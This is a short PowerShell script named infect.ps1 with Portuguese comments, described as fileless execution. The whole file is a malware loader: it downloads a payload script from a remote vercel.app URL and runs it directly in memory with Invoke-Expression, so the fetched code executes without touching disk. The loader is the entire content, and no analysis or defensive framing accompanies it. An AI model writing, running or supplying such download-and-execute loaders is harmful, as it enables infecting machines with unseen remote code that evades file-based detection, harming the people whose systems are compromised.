# infect.ps1 (fileless execution)
$payload = "https://testando123-blond.vercel.app/payload.ps1"

try {
    # Baixa o conteúdo do script remoto como texto
    $script = Invoke-WebRequest -Uri $payload -UseBasicParsing | Select-Object -ExpandProperty Content

    # Executa o conteúdo diretamente na memória
    Invoke-Expression $script
}
catch {
    Write-Host "Erro ao carregar o payload: $_"
}
